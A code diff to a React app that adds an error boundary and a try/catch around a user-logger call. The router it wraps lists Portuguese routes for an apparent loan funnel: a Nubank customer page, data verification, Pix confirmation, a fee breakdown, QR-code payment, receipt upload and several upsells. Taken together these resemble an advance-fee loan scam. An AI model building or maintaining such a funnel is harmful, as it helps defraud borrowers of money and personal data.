@@ -1,5 +1,6 @@
 import React, { useEffect } from 'react';
 import { BrowserRouter, Routes, Route, useLocation } from 'react-router-dom';
+import ErrorBoundary from './components/ErrorBoundary';
 
 function ScrollToTop() {
   const { pathname } = useLocation();
@@ -49,50 +50,56 @@ import './App.css';
 
 function App() {
   useEffect(() => {
-    initUserLogger();
+    try {
+      initUserLogger();
+    } catch (error) {
+      console.error('Failed to initialize user logger:', error);
+    }
   }, []);
 
   return (
-    <BrowserRouter>
-      <ScrollToTop />
-      <Routes>
-        <Route path="/presell" element={<PresellPage />} />
-        <Route path="/" element={<HomePage />} />
-        <Route path="/resultado" element={<ResultPage />} />
-        <Route path="/chat" element={<ChatPage />} />
-        <Route path="/aviso" element={<WarningPage />} />
-        <Route path="/conta-verificada" element={<AccountVerifiedPage />} />
-        <Route path="/verificando-dados" element={<DataVerificationPage />} />
-        <Route path="/valores-disponiveis" element={<AvailableValuesPage />} />
-        <Route path="/dados-recebimento" element={<DataForReceivingPage />} />
-        <Route path="/confirmar-pix" element={<PixConfirmationPage />} />
-        <Route path="/detalhamento-taxas" element={<TaxBreakdownPage />} />
-        <Route path="/pagamento-qrcode" element={<QRCodePaymentPage />} />
-        <Route path="/verificar-pagamento" element={<PaymentVerificationPage />} />
-        <Route path="/receipt-upload" element={<ReceiptUploadPage />} />
-        <Route path="/enviar-comprovante" element={<ReceiptUploadPage />} />
-        <Route path="/settings" element={<SettingsPage />} />
-        <Route path="/perguntas-perfil" element={<ProfileQuestionsPage />} />
-        <Route path="/autorizacao-credito" element={<CreditAuthorizationPage />} />
-        <Route path="/prioridade-emprestimo" element={<LoanPriorityPage />} />
-        <Route path="/cliente-nubank" element={<NubankCustomerPage />} />
-        <Route path="/status-credito" element={<CreditStatusPage />} />
-        <Route path="/emprestimo-aprovado" element={<LoanApprovedPage />} />
-        <Route path="/resumo-emprestimo" element={<LoanSummaryPage />} />
-        <Route path="/selecionar-parcelas" element={<InstallmentSelectionPage />} />
-        <Route path="/termos-emprestimo" element={<LoanTermsPage />} />
-        <Route path="/confirmacao-transferencia" element={<TransferConfirmationPage />} />
-        <Route path="/selecionar-vencimento" element={<DueDateSelectionPage />} />
-        <Route path="/vsl" element={<VSLPage />} />
-        <Route path="/upsell-1" element={<Upsell1Page />} />
-        <Route path="/upsell-2" element={<Upsell2Page />} />
-        <Route path="/upsell-3" element={<Upsell3Page />} />
-        <Route path="/upsell-4" element={<Upsell4Page />} />
-        <Route path="/upsell-5" element={<Upsell5Page />} />
-        <Route path="/upsell-payment" element={<UpsellPaymentPage />} />
-        <Route path="/final" element={<FinalPage />} />
-      </Routes>
-    </BrowserRouter>
+    <ErrorBoundary>
+      <BrowserRouter>
+        <ScrollToTop />
+        <Routes>
+          <Route path="/presell" element={<PresellPage />} />
+          <Route path="/" element={<HomePage />} />
+          <Route path="/resultado" element={<ResultPage />} />
+          <Route path="/chat" element={<ChatPage />} />
+          <Route path="/aviso" element={<WarningPage />} />
+          <Route path="/conta-verificada" element={<AccountVerifiedPage />} />
+          <Route path="/verificando-dados" element={<DataVerificationPage />} />
+          <Route path="/valores-disponiveis" element={<AvailableValuesPage />} />
+          <Route path="/dados-recebimento" element={<DataForReceivingPage />} />
+          <Route path="/confirmar-pix" element={<PixConfirmationPage />} />
+          <Route path="/detalhamento-taxas" element={<TaxBreakdownPage />} />
+          <Route path="/pagamento-qrcode" element={<QRCodePaymentPage />} />
+          <Route path="/verificar-pagamento" element={<PaymentVerificationPage />} />
+          <Route path="/receipt-upload" element={<ReceiptUploadPage />} />
+          <Route path="/enviar-comprovante" element={<ReceiptUploadPage />} />
+          <Route path="/settings" element={<SettingsPage />} />
+          <Route path="/perguntas-perfil" element={<ProfileQuestionsPage />} />
+          <Route path="/autorizacao-credito" element={<CreditAuthorizationPage />} />
+          <Route path="/prioridade-emprestimo" element={<LoanPriorityPage />} />
+          <Route path="/cliente-nubank" element={<NubankCustomerPage />} />
+          <Route path="/status-credito" element={<CreditStatusPage />} />
+          <Route path="/emprestimo-aprovado" element={<LoanApprovedPage />} />
+          <Route path="/resumo-emprestimo" element={<LoanSummaryPage />} />
+          <Route path="/selecionar-parcelas" element={<InstallmentSelectionPage />} />
+          <Route path="/termos-emprestimo" element={<LoanTermsPage />} />
+          <Route path="/confirmacao-transferencia" element={<TransferConfirmationPage />} />
+          <Route path="/selecionar-vencimento" element={<DueDateSelectionPage />} />
+          <Route path="/vsl" element={<VSLPage />} />
+          <Route path="/upsell-1" element={<Upsell1Page />} />
+          <Route path="/upsell-2" element={<Upsell2Page />} />
+          <Route path="/upsell-3" element={<Upsell3Page />} />
+          <Route path="/upsell-4" element={<Upsell4Page />} />
+          <Route path="/upsell-5" element={<Upsell5Page />} />
+          <Route path="/upsell-payment" element={<UpsellPaymentPage />} />
+          <Route path="/final" element={<FinalPage />} />
+        </Routes>
+      </BrowserRouter>
+    </ErrorBoundary>
   );
 }
 
